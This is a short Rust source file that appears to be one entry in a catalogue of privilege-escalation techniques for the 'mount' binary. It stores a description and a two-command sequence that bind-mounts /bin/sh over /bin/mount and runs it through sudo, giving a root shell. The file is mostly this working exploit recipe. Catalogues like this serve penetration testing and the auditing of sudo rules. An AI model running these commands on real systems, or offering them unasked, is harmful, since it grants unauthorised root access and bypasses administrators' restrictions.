pub static BIN_NAME: &'static str = "mount";
pub static SUDO_DESC: &'static str = "Exploit the fact that `mount` can be executed via `sudo` to replace the `mount` binary with a shell.";
pub static SUDO_CODE: &'static str = r#"
    
    sudo mount -o bind /bin/sh /bin/mount
    sudo mount
"#;
use crate::code::{Code, Tag};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
